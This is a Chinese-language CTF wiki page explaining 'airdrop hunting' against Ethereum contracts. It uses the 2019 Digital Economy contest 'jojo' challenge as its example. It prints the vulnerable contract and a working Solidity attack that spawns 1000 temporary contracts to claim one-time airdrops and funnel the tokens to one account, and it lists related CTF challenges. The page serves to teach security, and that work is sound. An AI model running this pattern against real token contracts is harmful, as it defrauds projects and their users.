# Airdrop Hunting

## 原理
薅羊毛攻击指使用多个不同的新账户来调用空投函数获得空投币并转账至攻击者账户以达到财富累计的一种攻击方式。这类攻击方式较为普通且常见，只要是有空投函数的合约都能够进行薅羊毛。其中首个自动化薅羊毛攻击出现在 [Simoleon](https://paper.seebug.org/646/) 上。

## 例子
以数字经济大赛 2019 的 jojo 一题为例，讲解一下如何进行薅羊毛攻击。题目合约的源码如下：
```solidity
pragma solidity ^0.4.24;

contract jojo {
    mapping(address => uint) public balanceOf;
    mapping(address => uint) public gift;
    address owner;
        
    constructor()public{
        owner = msg.sender;
    }
    
    event SendFlag(string b64email);
    
    function payforflag(string b64email) public {
        require(balanceOf[msg.sender] >= 100000);
        emit SendFlag(b64email);
    }
    
    function jojogame() payable{
        uint geteth = msg.value / 1000000000000000000;
        balanceOf[msg.sender] += geteth;
    }
    
    function gift() public {
        assert(gift[msg.sender] == 0);
        balanceOf[msg.sender] += 100;
        gift[msg.sender] = 1;
    }
    
    function transfer(address to,uint value) public{
        assert(balanceOf[msg.sender] >= value);
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
    }
    
}
```

可以发现我们需要满足 balanceOf[msg.sender] >= 100000 才可以得到 flag。

题目中有空投函数，每次空投可以使 balance 增加 100。

```solidity
function gift() public {
    assert(gift[msg.sender] == 0);
    balanceOf[msg.sender] += 100;
    gift[msg.sender] = 1;
}
```

并且也有转账函数，可以将 balance 转给其他用户。

```solidity
function transfer(address to,uint value) public{
    assert(balanceOf[msg.sender] >= value);
    balanceOf[msg.sender] -= value;
    balanceOf[to] += value;
}
```

那么我们可以使用薅羊毛的攻击方式，创建 1000 个临时合约来调用空投函数，并转账给主合约来使得 balanceOf[msg.sender] >= 100000。

```solidity
contract attack{
    function attack_airdrop(int num){
        for(int i = 0; i < num; i++){
            new middle_attack(this);
        }
    }
    
    function get_flag(string email){
        jojo target = jojo(0xA3197e9Bc965A22e975F1A26654D43D2FEb23d36);
        target.payforflag(email);
    }
}


contract middle_attack{
    constructor(address addr){
        jojo target = jojo(0xA3197e9Bc965A22e975F1A26654D43D2FEb23d36);
        target.gift();
        target.transfer(addr,100);
    }
}
```

## 题目

### 数字经济大赛 2019
- 题目名称 jojo

### RoarCTF 2019
- 题目名称 CoinFlip

### QWB 2019
- 题目名称 babybet

### bctf 2018
- 题目名称 Fake3d

!!! note
    注：题目附件相关内容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 仓库寻找。

## 参考
- [首个区块链 token 的自动化薅羊毛攻击分析](https://paper.seebug.org/646/)
- [数字经济大赛 2019 - jojo](https://github.com/beafb1b1/challenges/tree/master/szjj/2019_jojo)

